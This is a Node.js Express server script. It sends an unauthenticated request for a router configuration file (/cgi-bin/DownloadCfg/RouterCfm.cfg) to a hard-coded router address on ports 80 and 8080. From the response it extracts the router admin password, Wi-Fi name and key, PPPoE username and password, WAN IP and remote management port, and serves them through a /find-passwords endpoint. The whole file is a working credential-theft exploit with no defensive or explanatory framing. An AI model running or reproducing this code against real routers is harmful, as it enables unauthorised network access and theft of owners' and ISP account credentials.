const express = require('express');
const net = require('net');
const app = express();
const port = 3000; // Adjust the port as needed

app.use(express.static('public')); // Serve static files from the 'public' directory

function getRouterIps() {
    return ["192.168.144.120"];
}

function getPorts() {
    return [80,8080]; // Add multiple ports here
}

async function sendRequest(routerIp, port) {
    return new Promise((resolve, reject) => {
        const client = net.createConnection(port, routerIp, () => {
            client.write("GET /cgi-bin/DownloadCfg/RouterCfm.cfg HTTP/1.0\n\n");
        });

        let response = '';
        client.on('data', data => response += data);
        client.on('end', () => resolve(response));
        client.on('error', reject);
        client.setTimeout(1000);
        client.on('timeout', () => {
            client.destroy();
            reject(new Error('Connection timed out'));
        });
    });
}

function getPassword(response) {
    const passwd = response.split("http_passwd=")[1]; // Extract Admin password
    return passwd ? Buffer.from(passwd.split('\n')[0], 'base64').toString('utf-8') : 'Password not found';
}

function getWifiName(response) {
    const wifiNameMatch = response.match(/wl0_ssid=([^\n]+)/); // Extract the Wi-Fi name
    return wifiNameMatch ? wifiNameMatch[1].trim() : 'Unknown_Network';
}

function getWifiPass(response) {
    const wifiPassMatch = response.match(/wl0_wpa_psk=([^\n]+)/); // Extract the Wi-Fi Password
    return wifiPassMatch ? wifiPassMatch[1].trim() : 'Unknown_Wifipass';
}

function getUserName(response) {
    const userNameMatch = response.match(/wan0_pppoe_username=([^\n]+)/); // Extract the Wi-Fi Username
    return userNameMatch ? userNameMatch[1].trim() : 'Unknown_Username';
}

function getUserPass(response) {
    const userPassMatch = response.match(/wan0_pppoe_passwd=([^\n]+)/); // Extract the Wi-Fi User Password
    return userPassMatch ? userPassMatch[1].trim() : 'Unknown_Userpass';
}

function getWanIp(response) {
    const wanIpMatch = response.match(/wan0_ipaddr=([^\n]+)/); // Extract the WAN IP
    return wanIpMatch ? wanIpMatch[1].trim() : 'Unknown_Wanip';
}

function getPort(response) {
    const portMatch = response.match(/rm_web_port=([^\n]+)/); // Extract the remote management port
    return portMatch ? portMatch[1].trim() : 'Unknown_Port';
}

// Function to get current date and time in Bangladesh timezone
function getBangladeshDateTime() {
    const options = { timeZone: 'Asia/Dhaka', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
    return new Intl.DateTimeFormat('en-GB', options).format(new Date());
}

app.get('/find-passwords', async (req, res) => {
    const routerIps = getRouterIps();
    const ports = getPorts();
    const results = [];

    for (const routerIp of routerIps) {
        const currentDateTime = getBangladeshDateTime(); // Get current date and time

        for (const port of ports) {
            try {
                const response = await sendRequest(routerIp, port);
                const wifiName = getWifiName(response);
                const wifiPass = getWifiPass(response);
                const routerPass = getPassword(response);
                const wanIp = getWanIp(response); // Call the WAN IP extraction function
                const userName = getUserName(response); // Call the username extraction function
                const userPass = getUserPass(response); // Call the user password extraction function
                const remotePort = getPort(response); // Call the remote management port extraction function
                
                // Format the result string with all the details including date and time
                results.push(`Details from ${routerIp} (${currentDateTime}) on port ${port}:<br>Network: ${wifiName}<br>Wi-Fi Password: ${wifiPass}<br>Router Admin Password: ${routerPass}<br>WAN IP: ${wanIp}<br>Remote Management Port: ${remotePort}<br>Username: ${userName}<br>User Password: ${userPass}<br>`);
            } catch (error) {
                results.push(`Error connecting to ${routerIp}  (${currentDateTime}) on port ${port}: ${error.message}<br>`);
            }
        }
    }

    res.json(results); // Send results back to the client
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
